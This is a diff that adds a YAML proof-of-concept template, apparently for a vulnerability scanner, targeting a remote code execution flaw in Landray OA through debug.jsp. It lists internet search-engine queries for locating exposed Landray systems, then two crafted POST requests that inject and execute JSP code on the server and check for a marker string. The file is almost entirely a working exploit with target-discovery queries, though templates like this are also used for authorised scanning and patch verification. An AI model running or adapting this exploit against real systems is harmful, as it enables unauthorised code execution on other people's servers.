@@ -1,0 +1,44 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Landray-OA系统"
+    hunter-query: app.name="Landray 蓝凌OA"
+    quake-query: favicon:"302464c3f6207d57240649926cfc7bd4"
+    zoomeye-query: app:"蓝凌数字OA"
+    threatbook-query: 
+    cve: 
+    cnvd:
+    tips: 
+    
+name: poc-yaml-Landray-debug.jsp-rce
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /sys/ui/extend/varkind/custom.jsp
+            headers:
+              Content-type: application/x-www-form-urlencoded
+            body: var={"body":{"file":"/sys/common/debug.jsp"}}&fdCode=out.println("4ra1n");    
+        expression: response.status == 200 && response.body_string.contains("code.jsp")
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /sys/ui/extend/varkind/custom.jsp
+            headers:
+              Content-Type: application/x-www-form-urlencoded
+            body: var={"body":{"file":"/sys/common/code.jsp"}} 
+        expression: response.status == 200 && response.body_string.contains("4ra1n")
+
+expression: r0() && r1()
